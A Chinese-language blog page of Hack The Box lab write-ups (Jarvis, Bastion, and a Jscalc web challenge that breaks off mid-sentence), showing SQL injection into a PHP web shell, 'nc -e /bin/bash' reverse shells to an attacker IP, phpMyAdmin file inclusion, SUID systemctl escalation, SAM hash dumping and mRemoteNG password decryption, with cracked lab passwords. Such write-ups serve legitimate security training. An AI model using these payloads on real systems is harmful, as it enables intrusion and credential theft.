<h1 id="二，HTTP-Enumeration"><a href="#二，HTTP-Enumeration" class="headerlink" title="二，HTTP Enumeration"></a>二，HTTP Enumeration</h1><p>第一个习惯就是先把gobuster 上起来</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w directory-list-2.3-medium.txt -u 10.10.10.143 -t 50</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122115946864.png" class="lazyload"><br>发现有 <strong>phpmyadmin</strong><br>经过一番尝试，default 账号和密码都无效。暂时先跳过。</p>
<p>继续浏览 stark hotel(钢铁侠爱好者，stark 和 jarvis)</p>
<p>在网页上发现几处可疑的域名</p>
<p><strong>supersecurehotel.htb</strong><br><strong>logger.htb</strong></p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/2020012212053773.png" class="lazyload"><br>尝试着加进去 <strong>/etc/hosts</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">10.10.10.143 jarvis.htb supersecurehotel@logger.htb supersecurehotel.htb logger.htb</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>然后分别用 jarvis.htb, supersecurehotel.htb, logger.htb 等域名进行访问。 结果还是跟之前一样的 并没有什么区别。我们接着探索。</p>
<p>一顿胡乱点击后 发现 <strong>room.php</strong> 有可疑<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122121012113.png" class="lazyload"><br>尝试加个双引号引号 <strong>“</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1<span class="string">"</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>果然报错了<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122121923813.png" class="lazyload"><br>下一步 我们可以利用 ORDER BY 或者 UNION SELECT来找出查询语句有几个字段。</p>
<p><strong>ORDER BY</strong></p>
<p>首先使用orderby子句来确定SQL语句查询的字段数量。orderby子句会根据sql查询结果的字段来排序，如果字段不存在则会报错。</p>
<p>可以先从10 开始试</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 10</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>页面显示反常，代表没有10个字段， 一个一个慢慢下试<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122122904597.png" class="lazyload"><br>试到第7的时候 页面正常返回</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>确认了 有7个字段<br>紧接着 我们能使用 UNION SELECT来确定回显位</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,3,4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>可以确定 1 应该是ID，所以没有显示。<br>2 是 评分等级<br>3 是 价钱<br>4 是 介绍<br>5 是 图片<br>6 和 7 是未知。 当然这些都不重要 重要的是 回显位我们能看到。</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122123413127.png" class="lazyload"><br>可以利用mysql的一些函数来获取更多信息。 比如database()<br>数据库的名字叫<strong>hotel</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,database(),4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122140022261.png" class="lazyload"></p>
<h1 id="三，拿shell"><a href="#三，拿shell" class="headerlink" title="三，拿shell"></a>三，拿shell</h1><h5 id="我们有两种方式来拿到-www-data。"><a href="#我们有两种方式来拿到-www-data。" class="headerlink" title="我们有两种方式来拿到 www-data。"></a>我们有两种方式来拿到 www-data。</h5><p><strong>一种为利用mysql读写的方式注入php执行nc</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE <span class="string">'file_name'</span></span><br><span class="line">1</span><br><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,<span class="string">'&lt;?php system("nc -e /bin/bash 10.10.14.10 1234");?&gt;'</span>,4,5,6,7 INTO OUTFILE <span class="string">'/var/www/html/malicious.php'</span></span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>然后我们访问 <strong>10.10.10.143/malicious.php</strong><br>成功拿到 shell<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122141038552.png" class="lazyload"></p>
<hr>
<p><strong>第二种方式是通过 mysql函数导出 数据库的用户名和密码 登陆phpmyadmin.</strong></p>
<p>使用 <strong>group_concat</strong> 可以把 同一个分组中的值连接起来,返回一个字符串结果 利用 <strong>“:”</strong> 来隔离分开</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">room</span>.php?cod=<span class="number">999</span> union select <span class="number">1</span>,<span class="number">2</span>,(select group_concat(user,<span class="string">":"</span>,password,<span class="string">":"</span>,host) from mysql.user),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们成功取得 数据库的账号和密码哈希值</p>
<p><strong>Dbadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</strong><br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122141541617.png" class="lazyload"><br>利用 crackstation.net 来进行破解哈希值<br><img src="/images/placeholder.png" alt="img" data-src="/images/old-machine-images/20200122141930255.png" class="lazyload"><br>得到密码 <strong>imissyou</strong></p>
<p>找回之前的 phpmyadmin 登陆后发现<br><strong>Apache/2.4.25</strong><br><strong>phpmyadmin 4.8.0</strong><br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/2020012214211048.png" class="lazyload"><br>文章发表的时候 phpmyadmin 最新的版本为 5.0.1<br>一番searchsploit后发现 4.8.0和4.8.1 版本有远程执行文件包含漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44928">phpmyadmin 4.8 文件包含漏洞传送门</a></p>
<p>首先 运行sql命令</p>
<figure class="highlight php-template"><table><tbody><tr><td class="code"><pre><span class="line"><span class="language-xml">select '</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">"nc -e /bin/bash 10.10.14.12 1234"</span>);<span class="meta">?&gt;</span></span><span class="language-xml">'</span></span><br><span class="line"><span class="language-xml">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122142927469.png" class="lazyload"><br>拿到session的数值<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122143910250.png" class="lazyload"><br>然后进行访问</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">10.10</span>.<span class="number">10.143</span><span class="regexp">/phpmyadmin/i</span>ndex.php?target=db_sql.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sessions/sess_b6uigkomnmk4oaa91ckc4chk4nfahaqi</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122143843553.png" class="lazyload"><br>成功！</p>
<h1 id="四，提高用户权限"><a href="#四，提高用户权限" class="headerlink" title="四，提高用户权限"></a>四，提高用户权限</h1><p>第一件事情就是试试 sudo -l 有没有任何可以利用的权限。</p>
<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">jarvis:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">jarvis:</span></span><br><span class="line">    (pepper : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /var/www/<span class="title class_">Admin</span>-<span class="title class_">Utilities</span>/simpler.py</span><br><span class="line"></span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></tbody></table></figure>

<p>这是一个小型的警报器<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122144448439.png" class="lazyload"><br>仔细看了源代码，有一个地方可以使用命令注入，虽然做了点黑名单来过滤。 但是由于 <strong>$</strong> 还能使用。 我们可以用类似 <strong>$(cmd)</strong> 的操作。</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122144636466.png" class="lazyload"></p>
<figure class="highlight nsis"><table><tbody><tr><td class="code"><pre><span class="line">sudo -u pepper /<span class="keyword">var</span>/www/<span class="literal">Admin</span>-Utilities/simpler.py -p</span><br><span class="line">Enter an IP: <span class="variable">$(bash)</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们成功拿到pepper的shell<br>这里不懂出于什么原因 我各种命令全部都没响应。于是我用nc 重新生成了一个shell<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145229923.png" class="lazyload"></p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">pepper</span>@jarvis:/$nc -e /bin/bash <span class="number">10.10.14.10</span> <span class="number">1234</span></span><br><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">10.10.14.10</span> <span class="number">1234</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">123</span></span><br></pre></td></tr></tbody></table></figure>

<p>于是我们成功拿到pepper 的权限<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145350946.png" class="lazyload"></p>
<h1 id="五，ROOT提权"><a href="#五，ROOT提权" class="headerlink" title="五，ROOT提权"></a>五，ROOT提权</h1><p>首先我们来查看SUID files</p>
<figure class="highlight arcade"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145847426.png" class="lazyload">发现 <strong>systemctl</strong> 比较可疑。<br>通过 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/">gtfobins</a> 发现存在SUID 来进行提权的方法。<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122150211702.png" class="lazyload"><br>一般看到这种我都比较喜欢手动操作。<br>创建一个 pwn.service 在 pepper 的主目录里 并且把 ExecStart 指向 nc.sh</p>
<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line"><span class="attribute">Type</span>=oneshot</span><br><span class="line"><span class="attribute">ExecStart</span>=/home/pepper/nc.sh</span><br><span class="line">[Install]</span><br><span class="line"><span class="attribute">WantedBy</span>=multi-user.target</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc -e /bin/bash 10.10.14.10 1234</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></tbody></table></figure>

<p>然后我们要创建一个 symlink 起来</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">link</span> /home/pepper/pwn.service</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>打开 nc 接听<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122151106368.png" class="lazyload"></p>
<p>然后启动我们的pwn服务</p>
<figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> pwn</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们成功拿到root<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122151239547.png" class="lazyload"></p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/22/HTB-jarvis/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/13/HTB-wall/">HTB Wall Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 13, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		
			<p>这台机器比较有意思，正如名字 有一道“墙”。有趣的是这台机器的CMS CVE和机器的作者是同一个人。<br>作者尽量写出自己在遇到问题的时候碰到的坑 以及做了什么尝试和思路。</p>
		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/13/HTB-wall/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/10/HTB-bastion/">HTB Bastion Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p>攻击机：官方Kali linux 2019 64位<br>作者: <strong>Ikonw</strong></p>
<p><img src="/images/placeholder.png" alt="image-20200924210807049" data-src="/images/HTB-bastion/image-20200924210807049.png" class="lazyload"></p>
<h2 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h2><p><img src="/images/placeholder.png" alt="image-20200924210826254" data-src="/images/HTB-bastion/image-20200924210826254.png" class="lazyload"></p>
<p>正常的nmap端口扫描 没有太多的资讯，只有SMB和SSH 开着。</p>
<h2 id="二，SMB-Enumeration"><a href="#二，SMB-Enumeration" class="headerlink" title="二，SMB Enumeration"></a>二，SMB Enumeration</h2><p>首先，利用smbclient 连接到靶机<br>方式有很多种， smbmap之类的 但我比较喜欢用简单的smbclient.<br>smbmap等其他工具在真实环境里 会自动进行大量操作，很容易被日志捕捉下来。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient -L //10.10.10.134</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="image-20200924210848265" data-src="/images/HTB-bastion/image-20200924210848265.png" class="lazyload"></p>
<p>发现四个目标，其中三个是比较正常。<br>有意思的是 <strong>Backups</strong></p>
<p>我们利用smbclient 看看是否允许我们连接到 <strong>Backups</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.10.134\\Backups</span><br></pre></td></tr></tbody></table></figure>

<p>这里利用””来 逃脱 “” 所以需要4个，而backup 两个。</p>
<p><img src="/images/placeholder.png" alt="image-20200924210918572" data-src="/images/HTB-bastion/image-20200924210918572.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="asd" data-src="/images/HTB-bastion/2020011001300488.png" class="lazyload"></p>
<p>成功进入，发现三个文件。利用 <strong>get</strong> 把 <strong>note.txt</strong> 下载到本地。<br>大概的意思就是 系统管理员建议不要把整个backup 文件夹下载到本地。<br>按照文件夹的名字来看，应该是windows镜像的备份。</p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110013425912.png" class="lazyload"></p>
<p>于是我尝试将整个backup都挂载到本地。<br>在本地创建文件夹 <strong>/mnt/backup</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw</span><br></pre></td></tr></tbody></table></figure>

<p>挂载到本地并且允许读写操作</p>
<p><img src="/images/placeholder.png" alt="在这asd述" data-src="/images/HTB-bastion/20200110013652862.png" class="lazyload"></p>
<p>7z 有一个功能是可以让你直接读取 vhd文件的格式。我们直接来读取5gb的文件<br>(文件较大 大概2分钟左右， 文件较多就只展示一部分）</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在fdsaf" data-src="/images/HTB-bastion/20200110014239133.png" class="lazyload"></p>
<p>可以看到这是几乎整个windows的备份。<br>既然是windows备份 我们是不是可以从SAM File里面直接提取用户的帐号密码呢</p>
<h2 id="三，用户帐号密码"><a href="#三，用户帐号密码" class="headerlink" title="三，用户帐号密码"></a>三，用户帐号密码</h2><p>7z 只是让我们看到了文件，而不能看到内容。<br>我稍微google 了一下，发现一个兄弟在medium上面有篇文章利用ghost-mount挂载虚拟硬盘。<br>linux的 ghostmount 能让我们进入虚拟硬盘的文件</p>
<p>链接: <a target="_blank" rel="noopener" href="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25">文章地址</a></p>
<p>跟着大哥走<br>首先我们需要<strong>安装 libguestfs-tools</strong>这个库</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apt-get install libguestfs-tools</span><br></pre></td></tr></tbody></table></figure>

<p>简单的安装后，我们创建一个新的文件夹 <strong>/mnt/vhd</strong></p>
<p>把vhd挂载在 这个文件夹</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在asdasd" data-src="/images/HTB-bastion/20200110015004404.png" class="lazyload"></p>
<p>可以看到已经可以进入到 vhd文件里进行操作。<br>我首先要做的就是能不能直接到user desktop里拿到 user.txt</p>
<p>samdump2可以完成这个任务</p>
<p><img src="/images/placeholder.png" alt="在这asdasd" data-src="/images/HTB-bastion/20200110015521278.png" class="lazyload"></p>
<p>关于哈希值的利用方法很多，既然SMB是开着的 完全可以用哈希值传递攻击 登录系统。<br>个人原因 我比较喜欢尝试破解密码</p>
<figure class="highlight llvm"><table><tbody><tr><td class="code"><pre><span class="line">*disabled* Administrator:<span class="number">500</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">*disabled* Guest:<span class="number">501</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">L<span class="number">4</span>mpje:<span class="number">1000</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">26112010952</span>d<span class="number">963</span><span class="keyword">c</span><span class="number">8</span>dc<span class="number">4217</span>daec<span class="number">986</span>d<span class="number">9</span>:::</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></tbody></table></figure>

<p>注意这边 administrator和 Guest显得的是 <strong>disable</strong><br>正常来说格式是<br>&lt;用户名&gt;:&lt;用户ID&gt;:&lt; LM hash&gt;:&lt; NT hash&gt;:&lt;留言&gt;:&lt;主目录&gt;<br>Administrator和guest的 LM HASH和NT hash都是一模一样。<br>这边要注意 aad3 和 31d6 都是代表为空说明这里没有数值<br>题外话。</p>
<p>我们把L4mpje 的哈希值丢到crackstation.net 进行破解<br>得到帐号密码<br>L4mpje：bureaulampje</p>
<p><img src="/images/placeholder.png" alt="在这sadad" data-src="/images/HTB-bastion/20200110020035505.png" class="lazyload"></p>
<p>很可惜 我们没有 RDP， 但我们有SSH（狗头）</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">password: bureaulampje</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure>

<p>成功拿到 cmd shell<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110020241609.png" class="lazyload"><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110020309865.png" class="lazyload"><br>现在开始准备提权。<br>碰到windows 我个人习惯是上JAWL 的脚本来看系统的信息来帮助我提权。</p>
<p>链接: <a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">Jawl github地址</a></p>
<p>因为这是我的第一个文章 我就简单的说下 如何在windows里传输文件<br>其实方式有很多种，<br>有的情况这个可以 有的情况那个可以<br>我就简单说一下 我个人喜爱的一个方法。<br><strong>powershell</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -c <span class="string">"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.12/jaw</span></span><br><span class="line"><span class="string">s-enum.ps1','C:\Users\L4mpje\Desktop\jaws-enum.ps1')</span></span><br><span class="line"><span class="string">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>题外话结束</p>
<p>执行jaws-enum.ps1</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>大概的看了下 并没有什么有趣的信息，但有一个地方引起了关注<br><strong>mRemoteNG</strong><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110020826900.png" class="lazyload"></p>
<h2 id="四，提权"><a href="#四，提权" class="headerlink" title="四，提权"></a>四，提权</h2><p>碰到陌生的软件就要上Google询问，果然我们发现了这软件存在比较弱的密码保护管理。<br><img src="/images/placeholder.png" alt="在这里插sad" data-src="/images/HTB-bastion/20200110021000221.png" class="lazyload"><br>在另外一篇文章里 我们发现了储存密码的目录 是位于Appdata里。</p>
<p>链接:<a target="_blank" rel="noopener" href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">文章传送门</a></p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021043792.png" class="lazyload"><br>这里再说点题外话。<br>Appdata属于隐藏的文件夹类型 正常的dir 是无法看见文件夹</p>
<p><img src="/images/placeholder.png" alt="sadfasdfaf" data-src="/images/HTB-bastion/20200110021237568.png" class="lazyload"></p>
<p>利用 <strong>dir/a</strong> 来显示全部的文件</p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021316395.png" class="lazyload"></p>
<p>成功找到管理员的密码</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/HTB-bastion/20200110021405254.png" class="lazyload"></p>
<p>利用github上面的一个python 脚本 来算出密码</p>
<p>链接:github传送门</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 mremote_decrypt.py -s <span class="string">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span></span><br><span class="line"></span><br><span class="line">成功取得密码</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110021514274.png" class="lazyload"></p>
<p>紧接着 SSH登陆管理员 并拿到root.txt</p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110021619237.png" class="lazyload"></p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/10/HTB-bastion/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/1998/01/01/HTB-Web-Challenge/">HTB Web Challenge</a>  
	       
		 

		<div class="meta">
			<time>Jan 01, 1998</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<h1 id="Jscalc-Easy"><a href="#Jscalc-Easy" class="headerlink" title="Jscalc - Easy"></a>Jscalc - Easy</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑</p>
</blockquote>
<p>Poking through the website found it uses <code>eval()</code>, in this case, it is vulnerable directly execute javascript codes</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211110203037.png" class="lazyload"></p>
<p>Take a look at routes, the <code>/api/calculate</code> accept variable called ‘<code>formula</code>‘ and passed it to the <code>calculatorHelp</code> calculator for processing</p>
<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path       = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> express    = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> router     = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Calculator</span> = <span class="built_in">require</span>(<span class="string">'../helpers/calculatorHelper'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">response</span> = data =&gt; ({ <span class="attr">message</span>: data });</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">'views/index.html'</span>));</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">'/api/calculate'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">	<span class="keyword">let</span> { formula } = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (formula) {</span><br><span class="line">		result = <span class="title class_">Calculator</span>.<span class="title function_">calculate</span>(formula);</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(result));</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">'Missing parameters'</span>));</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ocd</span></span><br></pre></td></tr></tbody></table></figure>

<p>and it directly proceed with <code>eval</code> without sanitized the input</p>
<figure class="highlight plaintext"><figcaption><span>js</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">module.exports = {</span><br><span class="line">    calculate(formula) {</span><br><span class="line">        try {</span><br><span class="line">            return eval(`(function() { return ${ formula } ;}())`);</span><br><span class="line"></span><br><span class="line">        } catch (e) {</span><br><span class="line">            if (e instanceof SyntaxError) {</span><br><span class="line">                return 'Something went wrong!';</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><a target="_blank" rel="noopener" href="https://nodejs.org/en/learn/manipulating-files/reading-files-with-nodejs">Reading files with Node.js</a></p>
<p><code>readFileSync</code> can be used to read files.</p>
<p>craft payload in one line would be </p>
